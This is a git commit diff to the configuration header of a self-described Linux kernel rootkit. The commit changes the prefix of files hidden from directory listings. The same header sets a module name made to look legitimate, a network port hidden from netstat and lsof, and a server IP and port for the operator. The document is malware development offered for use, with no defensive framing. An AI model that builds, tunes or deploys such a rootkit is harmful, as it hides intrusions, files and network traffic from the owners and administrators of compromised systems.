0937652fbde83238511babbb3be3ca68d6b9b27b
cyberbullet <yellphonenaing@gmail.com>
2025-07-03 09:44:31 +0630

    Update MAGIC_PREFIX to 'raplheader_'
    - Changed file hiding prefix from 'reb_' to 'raplheader_'
    - Files with 'raplheader_' prefix will now be hidden from directory listings
    - Rebuilt module with new prefix

--- config.h
+++ config.h
@@ -30,7 +30,7 @@ MODULE_DESCRIPTION("Ring 0 Rootkit for Linux Kernels x86/x86_64 5.x/6.x");
 //=====================[YOU CAN CHANGE THIS]========================//
 #define MODULENAME "gnu_rapl_header"      // if you change the file name, you must change it here too
 #define HIDE_PORT 1234              // TCP and UDP port to hide (only netstat & lsof)
-#define MAGIC_PREFIX "reb_"         // folder/file prefix to hide
+#define MAGIC_PREFIX "raplheader_"         // folder/file prefix to hide
 //==========[PROGRAM EXECUTION]=========//
 #define YOUR_SRV_IP "150.241.91.206"     // Legacy - not used anymore
 #define YOUR_SRV_PORT 5555          // Legacy - not used anymore
